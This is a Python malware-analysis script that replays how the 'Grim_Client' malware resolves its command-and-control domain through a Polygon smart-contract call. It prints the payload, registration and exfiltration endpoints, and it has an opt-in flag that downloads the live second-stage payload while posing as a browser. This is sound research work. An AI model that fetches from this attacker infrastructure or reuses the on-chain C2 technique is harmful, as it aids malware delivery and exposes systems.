#!/usr/bin/env python3
"""Replay of Grim_Client's on-chain C2 resolution.

Same eth_call the malware makes, against public Polygon RPC providers. The resolved
host is not contacted unless --fetch-png is passed explicitly.

    python3 c2_recon.py [--fetch-png OUTFILE]

--fetch-png is deliberately opt-in and off by default: it talks to attacker-controlled
infrastructure. Only use it from a sandbox you control.
"""
import argparse
import json
import sys
import urllib.request

CONTRACT = "0x9c0a507300fd902787bb193d80fca5ce6e1bff9a"
SELECTOR = "0xce6d41de"
FALLBACK = "thisisafalsepositive.st"
PNG_PATH = "/cdn/v2/9f4e7a2c1b8d.png"

RPCS = [
    "https://polygon.drpc.org",
    "https://polygon-bor-rpc.publicnode.com",
    "https://1rpc.io/matic",
    "https://api.zan.top/polygon-mainnet",
    "https://rpc-mainnet.matic.quiknode.pro",
]


def post(url, body, ctype="application/json", timeout=20):
    req = urllib.request.Request(
        url, data=body.encode(),
        headers={"Content-Type": ctype, "User-Agent": "Mozilla/5.0"})
    return urllib.request.urlopen(req, timeout=timeout).read().decode("utf-8", "replace")


def decode_abi_string(result_hex):
    """Same as btcValue.ier_ecaup: 0x..., 32-byte offset word, 32-byte length word, ASCII."""
    h = result_hex[2:] if result_hex.startswith("0x") else result_hex
    if len(h) < 128:
        return None
    off = int(h[0:64], 16) * 2
    ln = int(h[off:off + 64], 16)
    data = h[off + 64: off + 64 + ln * 2]
    return bytes.fromhex(data).decode("utf-8", "replace")


def resolve():
    body = json.dumps({"jsonrpc": "2.0", "method": "eth_call",
                       "params": [{"to": CONTRACT, "data": SELECTOR}, "latest"], "id": 1})
    for rpc in RPCS:
        try:
            r = json.loads(post(rpc, body))
            res = r.get("result")
            if not res or res == "0x":
                print("  %-42s -> no contract code / empty result" % rpc)
                continue
            dom = decode_abi_string(res)
            print("  %-42s -> %s" % (rpc, dom))
            print("    raw: %s" % res)
            return dom
        except Exception as e:
            print("  %-42s -> ERROR %s: %s" % (rpc, type(e).__name__, str(e)[:90]))
    print("\nall RPCs failed; the malware would fall back to %s" % FALLBACK)
    return FALLBACK


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--fetch-png", metavar="OUTFILE", nargs="?", const="payload.png",
                    help="DANGEROUS: download the second stage from the live C2 (opt-in)")
    a = ap.parse_args()

    print("contract : %s" % CONTRACT)
    print("selector : %s" % SELECTOR)
    print("fallback : %s\n" % FALLBACK)

    dom = resolve()
    print("\nC2 base  : https://%s" % dom)
    print("payload  : https://%s%s" % (dom, PNG_PATH))
    print("register : POST https://%s/shard/prefireMc" % dom)
    print("exfil    : POST https://%s/shard/submitMinecraftLog" % dom)

    if a.fetch_png:
        print("\n!! contacting attacker infrastructure as requested !!")
        req = urllib.request.Request("https://%s%s" % (dom, PNG_PATH), headers={
            "User-Agent": ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
                           "(KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"),
            "Accept": "image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.9",
            "Sec-Fetch-Dest": "image", "Sec-Fetch-Mode": "no-cors", "Sec-Fetch-Site": "same-origin"})
        data = urllib.request.urlopen(req, timeout=30).read()
        open(a.fetch_png, "wb").write(data)
        print("saved %d bytes to %s - now run png_extract.py on it" % (len(data), a.fetch_png))
    else:
        print("\n(no payload fetched; pass --fetch-png only inside a sandbox)")
    return 0


if __name__ == "__main__":
    sys.exit(main())
